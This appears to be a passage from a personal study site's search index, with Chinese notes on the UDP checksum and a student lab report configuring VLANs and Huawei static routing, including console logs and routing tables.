\u867d\u7136\u8ba1\u7b97UDP\u6821\u9a8c\u548c\u7684\u57fa\u672c\u65b9\u6cd5\u4e0e\u6211\u4eec\u5728\u7b2c5\u7ae0\u63cf\u8ff0\u7684\u666e\u901a\u4e92\u8054\u7f51\u6821\u9a8c\u548c\uff0816\u4f4d\u5b57\u7684\u53cd\u7801\u548c\u7684\u53cd\u7801\uff09\u7c7b\u4f3c\uff0c\u4f46\u662f\u8981\u6ce8\u610f\u4e24\u4e2a\u5c0f\u7684\u7ec6\u8282\u3002\u9996\u5148\uff0cUDP\u6570\u636e\u62a5\u957f\u5ea6\u53ef\u4ee5\u662f\u5947\u6570\u4e2a\u5b57\u8282\uff0c\u800c\u6821\u9a8c\u548c\u7b97\u6cd5\u53ea\u76f8\u52a016\u4f4d\u5b57\uff08\u603b\u662f\u5076\u6570\u4e2a\u5b57\u8282\uff09\u3002UDP\u7684\u5904\u7406\u8fc7\u7a0b\u662f\u5728\u5947\u6570\u957f\u5ea6\u7684\u6570\u636e\u62a5\u5c3e\u90e8\u8ffd\u52a0\u4e00\u4e2a\u503c\u4e3a0\u7684\u586b\u5145\uff08\u865a\uff09\u5b57\u8282\uff0c\u8fd9\u4ec5\u4ec5\u53ea\u662f\u4e3a\u4e86\u6821\u9a8c\u548c\u7684\u8ba1\u7b97\u4e0e\u9a8c\u8bc1\u3002 \u7b2c\u4e8c\u4e2a\u7ec6\u8282\u662fUDP\uff08\u4e5f\u5305\u62ecTCP\uff09\u8ba1\u7b97\u5b83\u7684\u6821\u9a8c\u548c\u65f6\u5305\u542b\u4e86\uff08\u4ec5\u4ec5\uff09\u884d\u751f\u81eaIPv4\u5934\u90e8\u7684\u5b57\u6bb5\u7684\u4e00\u4e2a12\u5b57\u8282\u7684 \u4f2a\u5934\u90e8 \u6216\u884d\u751f\u81eaIPv6\u5934\u90e8\u7684\u5b57\u6bb5\u7684\u4e00\u4e2a40\u5b57\u8282\u7684\u4f2a\u5934\u90e8\u3002\u8fd9\u4e2a\u4f2a\u5934\u90e8\u4e5f\u662f\u865a\u7684\uff0c\u5b83\u7684\u76ee\u7684\u53ea\u662f\u7528\u4e8e\u6821\u9a8c\u548c\u7684\u8ba1\u7b97\uff08\u5728\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\uff09\u3002","title":"10.3 UDP\u6821\u9a8c\u548c"},{"location":"reading_notes/understanding_and_using_c_pointers/introduction/","text":"\u6307\u9488\u548c\u5185\u5b58 \u6307\u9488\u7684\u8bed\u6cd5\u548c\u8bed\u4e49\u5728C\u89c4\u8303\uff08\uff09","title":"Introduction"},{"location":"reading_notes/understanding_and_using_c_pointers/introduction/#_1","text":"\u6307\u9488\u7684\u8bed\u6cd5\u548c\u8bed\u4e49\u5728C\u89c4\u8303\uff08\uff09","title":"\u6307\u9488\u548c\u5185\u5b58"},{"location":"szu_courses/cn/router_lab/","text":"\u5199\u5728\u524d\u9762\u7684\u5e9f\u8bdd \u8fd9\u4e2a\u5b9e\u9a8c\u5927\u6982\u662f\u5728\u4e0a\u4e00\u6b21VLAN\u5b9e\u9a8c\u57fa\u7840\u4e0a\u7684\u4e00\u4e2a\u62d3\u5c55\u3002\u5728\u4e0a\u4e00\u6b21\u5b9e\u9a8c\u91cc\uff0c\u914d\u7f6e\u597dVLAN\u540e\uff0c\u5982\u679c\u4e24\u53f0\u4e3b\u673a\u4e0d\u5728\u540c\u4e00VLAN\u4e2d\uff0c\u5b83\u4eec\u5c06\u4e0d\u80fd\u4e92\u76f8\u901a\u4fe1\u3002\u8fd9\u6b21\u5b9e\u9a8c\u5c06\u8ba8\u8bba\u5982\u4f55\u914d\u7f6e\u8def\u7531\u4f7f\u5f97\u5b83\u4eec\u53ef\u4ee5\u901a\u4fe1\u3002 \u6211\u77e5\u9053\u4f60\u4eec\u5e94\u8be5\u4e0d\u9700\u8981\u6211\u5199\u8fd9\u7bc7\u4e86...\u4e0d\u8fc7\u8fd8\u662f\u987a\u4fbf\u6574\u7406\u4e00\u4e0b\u3002\u554a\uff0c\u6bd5\u7adf\u6211\u6bd4\u8f83\u83dc\u5bf9\u5427\uff0c\u6211\u8981\u662f\u778e\u626f\u9519\u4e86\u4ec0\u4e48\u9ebb\u70e6\u544a\u8bc9\u6211... \u8fd9\u6b21\u5c06\u4f1a\u7528\u5230\uff1a \u4e3b\u673a4\u53f0\uff0c\u5176\u4e2d\u4e00\u53f0\u901a\u8fc7\u4e32\u53e3\u7528Xshell\u8fde\u4e0a\u4ea4\u6362\u673a/\u8def\u7531\u5668\u8fdb\u884c\u7ba1\u7406\u3002 Quidway S3700\u7cfb\u5217\u4ea4\u6362\u673a1\u53f0\u3002\u7136\u540e\u8def\u7531\u5668\u662f\u5565\u6211\u4e0d\u8bb0\u5f97\u4e86\uff0c\u4f3c\u4e4e\u662f\u4e00\u53f0AR2800\u548c\u4e00\u53f0AR2811\uff1f\uff08\u4e0d\u8fc7\u8fd9\u4f3c\u4e4e\u4e0d\u91cd\u8981\u3002\uff09 \u54e6\u8fd8\u6709\uff0c\u989d\u5916\u7684\u7f51\u7ebf3\u6839\u3002 \u66f4\u65b0\uff1a\u67d0\u4e9b\u8def\u7531\u5668\u5373\u4f7f\u6062\u590d\u51fa\u5382\u8bbe\u7f6e\u4e5f\u9700\u8981\u8f93\u5165\u53e3\u4ee4\uff0c\u8fd9\u4e2a\u65f6\u5019\u4f60\u5c31\u9700\u8981\u67e5\u9605\u6587\u6863\u4e2d\u6709\u5173\u9ed8\u8ba4\u5bc6\u7801\u7684\u90e8\u5206\u3002\u8fd9\u6b21\u5b9e\u9a8c\u7684\u90e8\u5206\u673a\u5668\u7684\u9ed8\u8ba4\u5bc6\u7801\u662f huawei \u3002 \u6211\u4eec\u5148\u6765\u770b\u770b\u62d3\u6251\uff1a \u5b9e\u9a8c\u8981\u6c42 \u4f7f\u7528tracert\u548cping\u547d\u4ee4\u5206\u522b\u8ddf\u8e2a\u548c\u6d4b\u8bd5VLAN\u4e2d\u4e3b\u673a\u4e4b\u95f4\u901a\u8fc7\u8def\u7531\u5668\u8fde\u63a5\u7684\u7f51\u7edc\u8fde\u901a\u6027\u3002 \u6211\u9996\u5148\u628a4\u53f0\u4e3b\u673a\u8fde\u63a5\u5230\u4ea4\u6362\u673a\u7684\u76f8\u5e94\u63a5\u53e3\u4e0a\uff0c\u5e76\u4e14\u6839\u636e\u8981\u6c42\u8bbe\u7f6e\u597dIP\u5730\u5740\u3001\u5b50\u7f51\u63a9\u7801\u548c\u7f51\u5173\u3002\u968f\u540e\uff0c\u5c06\u4e24\u53f0\u8def\u7531\u5668\u8fde\u63a5\u5230\u4ea4\u6362\u673a\u4e0a\uff08\u8fd9\u4e2a\u987a\u5e8f\u53ef\u80fd\u6709\u70b9\u522b\u626d\uff09\uff0c\u7136\u540e\u5c31\u662f\u628a\u4e24\u53f0\u8def\u7531\u5668\u4e5f\u8fde\u63a5\u8d77\u6765\u3002 \u5f00\u59cb\u8e29\u5751 \u5b9e\u9a8c\u8981\u6c42\u4f3c\u4e4e\u662f\u4f7f\u7528\u4e32\u53e3\u8fde\u63a5\u4e24\u53f0\u8def\u7531\u5668\uff0c\u4e0d\u8fc7\u73b0\u5728\u8fd9\u4e24\u53f0\u597d\u50cf\u5e76\u6ca1\u6709\uff0c\u4e8e\u662f\u5c31\u7528\u7f51\u7ebf\u8fde\u4e0a\u4e86\uff1a \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u4ee5\u67e5\u770b\uff1a serial ports in router - 83105 - The Cisco Learning Network \u8fd8\u662f\u8ddf\u4e0a\u6b21\u4e00\u6837\uff0c\u5148\u5728\u4ea4\u6362\u673a\u4e0a\u914d\u7f6eVLAN\u3002\u6211\u5c31\u4e0d\u591a\u8bf4\u4ec0\u4e48\u4e86\uff0c\u7ffb\u4e0a\u4e00\u6b21\u7684\u6587\u7ae0\u5c31\u53ef\u4ee5\u4e86\u3002\u4e3b\u8981\u5c31\u662f\u5212\u5206\u4f7f\u5f97PC1\u3001PC2\u5728VLAN3\u4e2d\uff0c\u8ba9PC3\u3001PC4\u5728VLAN2\u4e2d\uff1a \uff08\u65e0\u89c6\u4e0a\u9762\u90a3\u4e2aGigabitEthernet0/0/3\u8fd8\u6709\u90a3\u4e2a\u5947\u602a\u7684sysname G2\uff09 \u968f\u540e\u5c31\u53ef\u4ee5\u628a\u4e32\u53e3\u7ebf\u6362\u5230\u8def\u7531\u5668\u4e0a\u914d\u7f6eIP\u548c\u8def\u7531\u8868\u4e86\u3002\u5bf9\u4e8e\u201cRouterA\u201d\uff0c\u8bbe\u7f6e\u597d\u4e24\u4e2a\u7aef\u53e3\u7684IP\uff0c\u5e76\u914d\u7f6e\u597d\u8def\u7531\u8868\u5c31\u53ef\u4ee5\u4e86\uff1a \u6709\u5173 interface Cellular \uff0c\u4f60\u6216\u8bb8\u53ef\u4ee5\u67e5\u770b \u8fd9\u91cc \u3002 \u5bf9\u4e8e\u8fd9\u53f0\u8def\u7531\u5668\uff0c\u5b83\u7684\u9759\u6001\u8def\u7531\u914d\u7f6e\u547d\u4ee4\u662f\uff1a 1 ip route - static \u548cPPT\u4e0a\u6240\u63d0\u4f9b\u7684\u6307\u5bfc\u6709\u51fa\u5165\uff0c\u8fd8\u662f\u770b\u770b\u6587\u6863\u597d\u4e86\u3002\u5bf9\u4e8e\u201cRouterB\u201d\u540c\u7406\uff1a \u8fd9\u91cc\u4f3c\u4e4e\u4e0d\u5b58\u5728\u4ec0\u4e48\u96be\u5ea6\u95ee\u9898\uff0c\u4e3b\u8981\u8fd8\u662f\u8981\u67e5\u4e00\u4e0b\u624b\u518c\u3002\u8fd9\u4e9b\u90fd\u641e\u5b9a\u4e86\u4e4b\u540e\u5c31\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e86\u3002 \u8def\u7531\u8ffd\u8e2a \u5bf9\u4e86\uff0c\u4e3a\u4e86\u7701\u4e8b\uff0c\u5e76\u4e14\u8fd9\u91cc\u4e5f\u4e0d\u8fde\u63a5\u4e92\u8054\u7f51\uff0c\u5c31\u5148\u628a\u5404\u53f0\u4e3b\u673a\u7684\u9632\u706b\u5899\u5148\u5173\u95ed\u4e86\u5427\u3002 \u6765\u770b\u770bPC2\uff0810.1.30.2\uff09\uff0c\u6211\u4eec\u8bd5\u8bd5\u5230PC3\uff0810.1.20.2\uff09\u7684\u8def\u7531\u8ffd\u8e2a\uff1a \u7531\u4e8e\u76ee\u7684\u5730\u5740\u548cPC2\u4e0d\u5728\u540c\u4e00\u5b50\u7f51\uff0c\u6570\u636e\u5305\u88ab\u53d1\u5f80\u7f51\u5173\uff0810.1.30.33\uff09\u3002\u7f51\u5173\u6839\u636e\u89c4\u5219\u5339\u914d\u5230\uff1a \u4e8e\u662f\u5c06\u5176\u8f6c\u53d1\u5230RouterB\uff0810.1.0.23\uff09\uff0c\u968f\u540e\u6839\u636e\u89c4\u5219\uff1a \u5373\u53ef\u5230\u8fbe\u76ee\u7684\u4e3b\u673a\u3002\u8fd9\u4e0e\u8def\u7531\u8ffd\u8e2a\u7684\u7ed3\u679c\u662f\u4e00\u81f4\u7684\u3002 \u53e6\u5916\u9644\u4e0aPC3\uff0810.1.20.2\uff09\u5230PC2\uff0810.1.30.3\uff09\u548cPC4\uff0810.1.20.3\uff09\u7684\u8def\u7531\u8ffd\u8e2a\uff0c\u9053\u7406\u662f\u7c7b\u4f3c\u7684\uff1a \u63a7\u5236\u53f0\u8bb0\u5f55 \u653e\u4e00\u4e9b\u8bb0\u5f55\uff0c\u5e0c\u671b\u5bf9\u5927\u5bb6\u6709\u6240\u5e2e\u52a9\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 [ G2 ] interface Ethernet0/0/2 [ G2-Ethernet0/0/2 ] port default vlan 2 [ G2-Ethernet0/0/2 ] interface Ethernet0/0/4 [ G2-Ethernet0/0/4 ] port default vlan 2 [ G2-Ethernet0/0/4 ] interface Ethernet0/0/6 [ G2-Ethernet0/0/6 ] port default vlan 2 [ G2-Ethernet0/0/6 ] display vlan 2 * : management-vlan --------------------- VLAN ID Type Status MAC Learning Broadcast/Multicast/Unicast Property -------------------------------------------------------------------------------- 2 common enable enable forward forward forward default ---------------- Untagged Port: Ethernet0/0/2 Ethernet0/0/4 Ethernet0/0/6 ---------------- Interface Physical Ethernet0/0/2 UP Ethernet0/0/4 UP Ethernet0/0/6 UP [ G2 ] interface Ethernet0/0/3 [ G2-Ethernet0/0/3 ] port default vlan 3 [ G2-Ethernet0/0/3 ] interface Ethernet0/0/5 [ G2-Ethernet0/0/5 ] port default vlan 3 [ G2-Ethernet0/0/5 ] interface Ethernet0/0/7 [ G2-Ethernet0/0/7 ] port default vlan 3 [ G2 ] display vlan 3 * : management-vlan --------------------- VLAN ID Type Status MAC Learning Broadcast/Multicast/Unicast Property -------------------------------------------------------------------------------- 3 common enable enable forward forward forward default ---------------- Untagged Port: Ethernet0/0/3 Ethernet0/0/5 Ethernet0/0/7 ---------------- Interface Physical Ethernet0/0/3 UP Ethernet0/0/5 UP Ethernet0/0/7 UP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 <Huawei>system-view [ Huawei ] sysname RouterA [ RouterA ] interface GigabitEthernet0/0/1 [ RouterA-GigabitEthernet0/0/1 ] ip address 10 .1.30.33 24 [ RouterA-GigabitEthernet0/0/1 ] interface GigabitEthernet0/0/0 [ RouterA-GigabitEthernet0/0/0 ] ip address 10 .1.0.33 24 [ RouterA-GigabitEthernet0/0/0 ] display current-configuration [ V200R001C01SPC500 ] # sysname RouterA # snmp-agent local-engineid 800007DB03101B5483B531 snmp-agent # voice # drop illegal-mac alarm # aaa authentication-scheme default authorization-scheme default accounting-scheme default domain default domain default_admin local-user admin password simple admin local-user admin service-type http # interface GigabitEthernet0/0/0 ip address 10 .1.0.33 255 .255.255.0 # interface GigabitEthernet0/0/1 ip address 10 .1.30.33 255 .255.255.0 # interface GigabitEthernet0/0/2 # interface Cellular0/0/0 link-protocol ppp # interface Cellular0/0/1 link-protocol ppp # interface NULL0 # user-interface con 0 user-interface vty 0 4 user-interface vty 16 20 # return [ RouterA ] ip route-static 10 .1.20.0 24 10 .1.0.23 [ RouterA ] ip route-static 10 .1.30.0 24 GigabitEthernet0/0/1 [ RouterA ] display ip routing-table Route Flags: R - relay, D - download to fib ------------------------------------------------------------------------------ Routing Tables: Public Destinations : 11 Routes : 11 Destination/Mask Proto Pre Cost Flags NextHop Interface 10 .1.0.0/24 Direct 0 0 D 10 .1.0.33 GigabitEthernet0/0/0 10 .1.0.33/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 10 .1.0.255/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 10 .1.20.0/24 Static 60 0 RD 10 .1.0.23 GigabitEthernet0/0/0 10 .1.30.0/24 Direct 0 0 D 10 .1.30.33 GigabitEthernet0/0/1 10 .1.30.33/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 10 .1.30.255/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 127 .0.0.0/8 Direct 0 0 D 127 .0.0.1 InLoopBack0 127 .0.0.1/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 127 .255.255.255/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 255 .255.255.255/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 1 2 3 4 5 6 [ RouterB ] interface GigabitEthernet0/0/0 [ RouterB-GigabitEthernet0/0/0 ] ip address 10 .1.0.23 24 [ RouterB-GigabitEthernet0/0/0 ] interface GigabitEthernet0/0/1 [ RouterB-GigabitEthernet0/0/1 ] ip address 10 .1.20.33 24 [ RouterB ] ip route-static 10 .1.30.0 24 10 .1.0.33 [ RouterB ] ip route-static 10 .1.20.0 24 GigabitEthernet0/0/1 \u5173\u952e\u8bcd \u5b9e\u9a8c\u62a5\u544a \u8def\u7531\u5668\u4e0e\u9759\u6001\u8def\u7531\u914d\u7f6e \u8ba1\u7b97\u673a\u7f51\u7edc","title":"Router Lab"},{"location":"szu_courses/cn/router_lab/#_1","text":"\u8fd9\u4e2a\u5b9e\u9a8c\u5927\u6982\u662f\u5728\u4e0a\u4e00\u6b21VLAN\u5b9e\u9a8c\u57fa\u7840\u4e0a\u7684\u4e00\u4e2a\u62d3\u5c55\u3002\u5728\u4e0a\u4e00\u6b21\u5b9e\u9a8c\u91cc\uff0c\u914d\u7f6e\u597dVLAN\u540e\uff0c\u5982\u679c\u4e24\u53f0\u4e3b\u673a\u4e0d\u5728\u540c\u4e00VLAN\u4e2d\uff0c\u5b83\u4eec\u5c06\u4e0d\u80fd\u4e92\u76f8\u901a\u4fe1\u3002\u8fd9\u6b21\u5b9e\u9a8c\u5c06\u8ba8\u8bba\u5982\u4f55\u914d\u7f6e\u8def\u7531\u4f7f\u5f97\u5b83\u4eec\u53ef\u4ee5\u901a\u4fe1\u3002 \u6211\u77e5\u9053\u4f60\u4eec\u5e94\u8be5\u4e0d\u9700\u8981\u6211\u5199\u8fd9\u7bc7\u4e86...\u4e0d\u8fc7\u8fd8\u662f\u987a\u4fbf\u6574\u7406\u4e00\u4e0b\u3002\u554a\uff0c\u6bd5\u7adf\u6211\u6bd4\u8f83\u83dc\u5bf9\u5427\uff0c\u6211\u8981\u662f\u778e\u626f\u9519\u4e86\u4ec0\u4e48\u9ebb\u70e6\u544a\u8bc9\u6211... \u8fd9\u6b21\u5c06\u4f1a\u7528\u5230\uff1a \u4e3b\u673a4\u53f0\uff0c\u5176\u4e2d\u4e00\u53f0\u901a\u8fc7\u4e32\u53e3\u7528Xshell\u8fde\u4e0a\u4ea4\u6362\u673a/\u8def\u7531\u5668\u8fdb\u884c\u7ba1\u7406\u3002 Quidway S3700\u7cfb\u5217\u4ea4\u6362\u673a1\u53f0\u3002\u7136\u540e\u8def\u7531\u5668\u662f\u5565\u6211\u4e0d\u8bb0\u5f97\u4e86\uff0c\u4f3c\u4e4e\u662f\u4e00\u53f0AR2800\u548c\u4e00\u53f0AR2811\uff1f\uff08\u4e0d\u8fc7\u8fd9\u4f3c\u4e4e\u4e0d\u91cd\u8981\u3002\uff09 \u54e6\u8fd8\u6709\uff0c\u989d\u5916\u7684\u7f51\u7ebf3\u6839\u3002 \u66f4\u65b0\uff1a\u67d0\u4e9b\u8def\u7531\u5668\u5373\u4f7f\u6062\u590d\u51fa\u5382\u8bbe\u7f6e\u4e5f\u9700\u8981\u8f93\u5165\u53e3\u4ee4\uff0c\u8fd9\u4e2a\u65f6\u5019\u4f60\u5c31\u9700\u8981\u67e5\u9605\u6587\u6863\u4e2d\u6709\u5173\u9ed8\u8ba4\u5bc6\u7801\u7684\u90e8\u5206\u3002\u8fd9\u6b21\u5b9e\u9a8c\u7684\u90e8\u5206\u673a\u5668\u7684\u9ed8\u8ba4\u5bc6\u7801\u662f huawei \u3002 \u6211\u4eec\u5148\u6765\u770b\u770b\u62d3\u6251\uff1a","title":"\u5199\u5728\u524d\u9762\u7684\u5e9f\u8bdd"},{"location":"szu_courses/cn/router_lab/#_2","text":"\u4f7f\u7528tracert\u548cping\u547d\u4ee4\u5206\u522b\u8ddf\u8e2a\u548c\u6d4b\u8bd5VLAN\u4e2d\u4e3b\u673a\u4e4b\u95f4\u901a\u8fc7\u8def\u7531\u5668\u8fde\u63a5\u7684\u7f51\u7edc\u8fde\u901a\u6027\u3002 \u6211\u9996\u5148\u628a4\u53f0\u4e3b\u673a\u8fde\u63a5\u5230\u4ea4\u6362\u673a\u7684\u76f8\u5e94\u63a5\u53e3\u4e0a\uff0c\u5e76\u4e14\u6839\u636e\u8981\u6c42\u8bbe\u7f6e\u597dIP\u5730\u5740\u3001\u5b50\u7f51\u63a9\u7801\u548c\u7f51\u5173\u3002\u968f\u540e\uff0c\u5c06\u4e24\u53f0\u8def\u7531\u5668\u8fde\u63a5\u5230\u4ea4\u6362\u673a\u4e0a\uff08\u8fd9\u4e2a\u987a\u5e8f\u53ef\u80fd\u6709\u70b9\u522b\u626d\uff09\uff0c\u7136\u540e\u5c31\u662f\u628a\u4e24\u53f0\u8def\u7531\u5668\u4e5f\u8fde\u63a5\u8d77\u6765\u3002","title":"\u5b9e\u9a8c\u8981\u6c42"},{"location":"szu_courses/cn/router_lab/#_3","text":"\u5b9e\u9a8c\u8981\u6c42\u4f3c\u4e4e\u662f\u4f7f\u7528\u4e32\u53e3\u8fde\u63a5\u4e24\u53f0\u8def\u7531\u5668\uff0c\u4e0d\u8fc7\u73b0\u5728\u8fd9\u4e24\u53f0\u597d\u50cf\u5e76\u6ca1\u6709\uff0c\u4e8e\u662f\u5c31\u7528\u7f51\u7ebf\u8fde\u4e0a\u4e86\uff1a \u6709\u5173\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u4ee5\u67e5\u770b\uff1a serial ports in router - 83105 - The Cisco Learning Network \u8fd8\u662f\u8ddf\u4e0a\u6b21\u4e00\u6837\uff0c\u5148\u5728\u4ea4\u6362\u673a\u4e0a\u914d\u7f6eVLAN\u3002\u6211\u5c31\u4e0d\u591a\u8bf4\u4ec0\u4e48\u4e86\uff0c\u7ffb\u4e0a\u4e00\u6b21\u7684\u6587\u7ae0\u5c31\u53ef\u4ee5\u4e86\u3002\u4e3b\u8981\u5c31\u662f\u5212\u5206\u4f7f\u5f97PC1\u3001PC2\u5728VLAN3\u4e2d\uff0c\u8ba9PC3\u3001PC4\u5728VLAN2\u4e2d\uff1a \uff08\u65e0\u89c6\u4e0a\u9762\u90a3\u4e2aGigabitEthernet0/0/3\u8fd8\u6709\u90a3\u4e2a\u5947\u602a\u7684sysname G2\uff09 \u968f\u540e\u5c31\u53ef\u4ee5\u628a\u4e32\u53e3\u7ebf\u6362\u5230\u8def\u7531\u5668\u4e0a\u914d\u7f6eIP\u548c\u8def\u7531\u8868\u4e86\u3002\u5bf9\u4e8e\u201cRouterA\u201d\uff0c\u8bbe\u7f6e\u597d\u4e24\u4e2a\u7aef\u53e3\u7684IP\uff0c\u5e76\u914d\u7f6e\u597d\u8def\u7531\u8868\u5c31\u53ef\u4ee5\u4e86\uff1a \u6709\u5173 interface Cellular \uff0c\u4f60\u6216\u8bb8\u53ef\u4ee5\u67e5\u770b \u8fd9\u91cc \u3002 \u5bf9\u4e8e\u8fd9\u53f0\u8def\u7531\u5668\uff0c\u5b83\u7684\u9759\u6001\u8def\u7531\u914d\u7f6e\u547d\u4ee4\u662f\uff1a 1 ip route - static \u548cPPT\u4e0a\u6240\u63d0\u4f9b\u7684\u6307\u5bfc\u6709\u51fa\u5165\uff0c\u8fd8\u662f\u770b\u770b\u6587\u6863\u597d\u4e86\u3002\u5bf9\u4e8e\u201cRouterB\u201d\u540c\u7406\uff1a \u8fd9\u91cc\u4f3c\u4e4e\u4e0d\u5b58\u5728\u4ec0\u4e48\u96be\u5ea6\u95ee\u9898\uff0c\u4e3b\u8981\u8fd8\u662f\u8981\u67e5\u4e00\u4e0b\u624b\u518c\u3002\u8fd9\u4e9b\u90fd\u641e\u5b9a\u4e86\u4e4b\u540e\u5c31\u53ef\u4ee5\u6765\u6d4b\u8bd5\u4e86\u3002","title":"\u5f00\u59cb\u8e29\u5751"},{"location":"szu_courses/cn/router_lab/#_4","text":"\u5bf9\u4e86\uff0c\u4e3a\u4e86\u7701\u4e8b\uff0c\u5e76\u4e14\u8fd9\u91cc\u4e5f\u4e0d\u8fde\u63a5\u4e92\u8054\u7f51\uff0c\u5c31\u5148\u628a\u5404\u53f0\u4e3b\u673a\u7684\u9632\u706b\u5899\u5148\u5173\u95ed\u4e86\u5427\u3002 \u6765\u770b\u770bPC2\uff0810.1.30.2\uff09\uff0c\u6211\u4eec\u8bd5\u8bd5\u5230PC3\uff0810.1.20.2\uff09\u7684\u8def\u7531\u8ffd\u8e2a\uff1a \u7531\u4e8e\u76ee\u7684\u5730\u5740\u548cPC2\u4e0d\u5728\u540c\u4e00\u5b50\u7f51\uff0c\u6570\u636e\u5305\u88ab\u53d1\u5f80\u7f51\u5173\uff0810.1.30.33\uff09\u3002\u7f51\u5173\u6839\u636e\u89c4\u5219\u5339\u914d\u5230\uff1a \u4e8e\u662f\u5c06\u5176\u8f6c\u53d1\u5230RouterB\uff0810.1.0.23\uff09\uff0c\u968f\u540e\u6839\u636e\u89c4\u5219\uff1a \u5373\u53ef\u5230\u8fbe\u76ee\u7684\u4e3b\u673a\u3002\u8fd9\u4e0e\u8def\u7531\u8ffd\u8e2a\u7684\u7ed3\u679c\u662f\u4e00\u81f4\u7684\u3002 \u53e6\u5916\u9644\u4e0aPC3\uff0810.1.20.2\uff09\u5230PC2\uff0810.1.30.3\uff09\u548cPC4\uff0810.1.20.3\uff09\u7684\u8def\u7531\u8ffd\u8e2a\uff0c\u9053\u7406\u662f\u7c7b\u4f3c\u7684\uff1a","title":"\u8def\u7531\u8ffd\u8e2a"},{"location":"szu_courses/cn/router_lab/#_5","text":"\u653e\u4e00\u4e9b\u8bb0\u5f55\uff0c\u5e0c\u671b\u5bf9\u5927\u5bb6\u6709\u6240\u5e2e\u52a9\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 [ G2 ] interface Ethernet0/0/2 [ G2-Ethernet0/0/2 ] port default vlan 2 [ G2-Ethernet0/0/2 ] interface Ethernet0/0/4 [ G2-Ethernet0/0/4 ] port default vlan 2 [ G2-Ethernet0/0/4 ] interface Ethernet0/0/6 [ G2-Ethernet0/0/6 ] port default vlan 2 [ G2-Ethernet0/0/6 ] display vlan 2 * : management-vlan --------------------- VLAN ID Type Status MAC Learning Broadcast/Multicast/Unicast Property -------------------------------------------------------------------------------- 2 common enable enable forward forward forward default ---------------- Untagged Port: Ethernet0/0/2 Ethernet0/0/4 Ethernet0/0/6 ---------------- Interface Physical Ethernet0/0/2 UP Ethernet0/0/4 UP Ethernet0/0/6 UP [ G2 ] interface Ethernet0/0/3 [ G2-Ethernet0/0/3 ] port default vlan 3 [ G2-Ethernet0/0/3 ] interface Ethernet0/0/5 [ G2-Ethernet0/0/5 ] port default vlan 3 [ G2-Ethernet0/0/5 ] interface Ethernet0/0/7 [ G2-Ethernet0/0/7 ] port default vlan 3 [ G2 ] display vlan 3 * : management-vlan --------------------- VLAN ID Type Status MAC Learning Broadcast/Multicast/Unicast Property -------------------------------------------------------------------------------- 3 common enable enable forward forward forward default ---------------- Untagged Port: Ethernet0/0/3 Ethernet0/0/5 Ethernet0/0/7 ---------------- Interface Physical Ethernet0/0/3 UP Ethernet0/0/5 UP Ethernet0/0/7 UP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 <Huawei>system-view [ Huawei ] sysname RouterA [ RouterA ] interface GigabitEthernet0/0/1 [ RouterA-GigabitEthernet0/0/1 ] ip address 10 .1.30.33 24 [ RouterA-GigabitEthernet0/0/1 ] interface GigabitEthernet0/0/0 [ RouterA-GigabitEthernet0/0/0 ] ip address 10 .1.0.33 24 [ RouterA-GigabitEthernet0/0/0 ] display current-configuration [ V200R001C01SPC500 ] # sysname RouterA # snmp-agent local-engineid 800007DB03101B5483B531 snmp-agent # voice # drop illegal-mac alarm # aaa authentication-scheme default authorization-scheme default accounting-scheme default domain default domain default_admin local-user admin password simple admin local-user admin service-type http # interface GigabitEthernet0/0/0 ip address 10 .1.0.33 255 .255.255.0 # interface GigabitEthernet0/0/1 ip address 10 .1.30.33 255 .255.255.0 # interface GigabitEthernet0/0/2 # interface Cellular0/0/0 link-protocol ppp # interface Cellular0/0/1 link-protocol ppp # interface NULL0 # user-interface con 0 user-interface vty 0 4 user-interface vty 16 20 # return [ RouterA ] ip route-static 10 .1.20.0 24 10 .1.0.23 [ RouterA ] ip route-static 10 .1.30.0 24 GigabitEthernet0/0/1 [ RouterA ] display ip routing-table Route Flags: R - relay, D - download to fib ------------------------------------------------------------------------------ Routing Tables: Public Destinations : 11 Routes : 11 Destination/Mask Proto Pre Cost Flags NextHop Interface 10 .1.0.0/24 Direct 0 0 D 10 .1.0.33 GigabitEthernet0/0/0 10 .1.0.33/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 10 .1.0.255/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 10 .1.20.0/24 Static 60 0 RD 10 .1.0.23 GigabitEthernet0/0/0 10 .1.30.0/24 Direct 0 0 D 10 .1.30.33 GigabitEthernet0/0/1 10 .1.30.33/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 10 .1.30.255/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 127 .0.0.0/8 Direct 0 0 D 127 .0.0.1 InLoopBack0 127 .0.0.1/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 127 .255.255.255/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 255 .255.255.255/32 Direct 0 0 D 127 .0.0.1 InLoopBack0 1 2 3 4 5 6 [ RouterB ] interface GigabitEthernet0/0/0 [ RouterB-GigabitEthernet0/0/0 ] ip address 10 .1.0.23 24 [ RouterB-GigabitEthernet0/0/0 ] interface GigabitEthernet0/0/1 [ RouterB-GigabitEthernet0/0/1 ] ip address 10 .1.20.33 24 [ RouterB ] ip route-static 10 .1.30.0 24 10 